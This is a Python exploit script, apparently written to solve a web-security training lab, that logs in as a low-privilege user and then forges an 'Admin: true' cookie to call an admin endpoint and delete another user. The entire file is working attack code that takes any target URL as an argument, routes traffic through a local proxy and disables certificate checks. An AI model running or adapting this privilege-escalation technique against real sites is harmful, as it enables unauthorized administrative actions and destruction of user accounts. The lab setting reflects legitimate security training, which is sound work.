#!/usr/bin/python3
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# based on the lab we must represent the csrf token in our request so this fun
# get the csrf from the server response
def get_csrf_token(session, url):
    # here we make a request to the endpoint where we capture csrf which /login endpoint
    request = session.get(url, verify=False, proxies=proxies)

    # here we parse the response as html code to extract csrf from hidden input field
    parser_response = BeautifulSoup(request.text, 'html.parser')

    # save the token in argument here we pass the type of field which input
    # then the attribute which name, and we get its value
    token = parser_response.find("input", {'name': 'csrf'})['value']
    return token


# this function delete user based on url parameter which username
def delete_carlos(session, url):
    # here we need to get csrf token after login to represent to the request
    user_login = url + "/login"
    token = get_csrf_token(session, user_login)
    # login process with csrf and username ad password using session which track the user
    data_to_be_send = {"csrf": token, "username": "wiener", "password": "peter"}
    post_request = session.post(user_login, data=data_to_be_send, verify=False, proxies=proxies)
    # parse the response as text to extract log out which mean the user login successfully
    response = post_request.text
    if "Log out" in response:
        print("[*] successfully login in as wiener")
        # here get value of the session header in the response
        session_cookies = post_request.cookies.get_dict().get('session')
        deleting_url = url + "/admin/delete?username=carlos"
        # set cookie with admin privileges
        admin_cookie = {"session": session_cookies, "Admin": "true"}
        final_request = requests.get(deleting_url, cookies=admin_cookie, verify=False, proxies=proxies)
        if final_request.status_code == 200:
            print("[*] exploiting the endpoint was successfully.")
        else:
            print("[-] an error occur.")
    else:
        print("[-] an error occur")


def exploit():
    if len(sys.argv) != 2:
        print("[-] Unexpected error occur")
        print("[*] Usage of the script is: {} <your url>".format(sys.argv[0]))
        exit(-1)
    session_tracker = requests.session()
    url = sys.argv[1]
    delete_carlos(session_tracker, url)


if __name__ == "__main__":
    exploit()
